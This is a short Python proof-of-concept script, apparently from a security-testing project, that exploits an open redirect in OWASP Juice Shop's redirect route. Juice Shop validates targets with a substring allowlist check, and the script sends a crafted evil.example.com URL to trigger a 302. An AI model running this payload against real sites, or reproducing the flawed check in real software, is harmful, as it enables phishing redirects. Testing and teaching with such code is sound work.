"""Open redirect in routes/redirect.ts.

lib/insecurity.ts validates the target with `url.includes(allowedUrl)`, a
substring check, so a URL that merely *contains* an allowlisted string passes.
No official test sends the malicious payload (they only redirect to allowlisted
targets), so this is a project PoC. Success: the server issues a 302 to an
attacker-controlled host that carries an allowlisted substring in the query.
"""

import urllib.error
import urllib.parse
import urllib.request

ATTACKER = "https://evil.example.com/?x=https://github.com/juice-shop/juice-shop"


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args):
        return None


def exploit(base: str) -> tuple[bool, str]:
    url = f"{base}/redirect?to={urllib.parse.quote(ATTACKER)}"
    opener = urllib.request.build_opener(_NoRedirect)
    try:
        opener.open(url)
        return False, "not redirected"
    except urllib.error.HTTPError as err:
        location = err.headers.get("Location", "")
        return err.code == 302 and location.startswith("https://evil.example.com"), f"HTTP {err.code} -> {location[:40]}"
